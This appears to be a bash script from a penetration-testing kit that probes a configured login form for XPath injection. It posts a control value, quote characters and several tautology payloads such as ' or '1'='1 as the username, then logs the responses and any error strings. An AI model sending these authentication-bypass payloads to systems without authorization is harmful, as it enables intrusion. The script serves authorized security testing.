#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/common.sh"
load_env
require_cmds curl awk grep sed
setup_run_dir "28-xpath-injection-login"

printf 'Generate a fresh TOTP now, then enter it immediately.\n'
prompt_secret TEST_TOTP_CODE 'Current TOTP: '
while IFS='|' read -r case_label userval; do
  curl -sS -o "${case_label}.html" -D "${case_label}.headers" -X POST "${TARGET_BASE_URL}${LOGIN_PATH}" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "username=${userval}" \
    --data-urlencode "password=wrongpass" \
    --data-urlencode "totp_code=${TEST_TOTP_CODE}"
  printf '\n===== %s =====\nusername=%s\nhttp=%s\nlen=%s\nlocation=%s\ntitle=%s\n' \
    "${case_label}" "${userval}" "$(header_code "${case_label}.headers")" "$(header_field "${case_label}.headers" content-length)" "$(header_field "${case_label}.headers" location)" "$(html_title "${case_label}.html")"
  grep -Eoi 'The supplied credentials were not accepted\.|Too many login attempts were observed\. Please try again later\.|Invalid Request|Login Failed|Mailboxes|server error|ldap|directory|exception|error|invalid' "${case_label}.html" | sed -n '1,20p'
done <<'EOF'
control|zzzz-xpath-control-001
single_quote|zzzz-xpath-quote-001'
syntax_probe|'
tautology_1|' or '1'='1
tautology_2|x' or '1'='1
tautology_3|' or 1=1 or '
EOF

printf '\nSaved in %s\n' "$RUN_DIR"
